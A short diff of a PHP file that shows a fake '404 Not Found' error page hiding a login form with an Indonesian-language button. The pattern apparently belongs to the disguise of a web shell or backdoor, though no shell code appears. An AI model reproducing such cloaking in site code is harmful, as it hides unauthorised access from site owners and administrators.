@@ -29,7 +29,7 @@ if (!isset($_SESSION['loggedin'])) {
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>403 Forbidden</title>
+        <title>404 Not Found</title>
         <style>
             @media (prefers-color-scheme:dark) { body { background-color:#000!important; } }
             body {
@@ -110,8 +110,8 @@ if (!isset($_SESSION['loggedin'])) {
     <body>
         <div class="container">
             <div class="error-box">
-                <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">403</h1>
-                <h2 style="margin-top:20px; font-size:30px;">Forbidden</h2>
+                <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">404</h1>
+                <h2 style="margin-top:20px; font-size:30px;">Not Found</h2>
                 <p>Access to this resource on the server is denied!</p>
             </div>
         </div>
@@ -127,7 +127,7 @@ if (!isset($_SESSION['loggedin'])) {
             <form method="POST">
                 <input type="text" name="username" placeholder="Username" required>
                 <input type="password" name="password" placeholder="Password" required>
-                <button type="submit">MASUK</button>
+                <button type="submit">MASUKIN LAGI</button>
             </form>
             <?php if (isset($error)) echo "<p class='error'>$error</p>"; ?>
         </div>
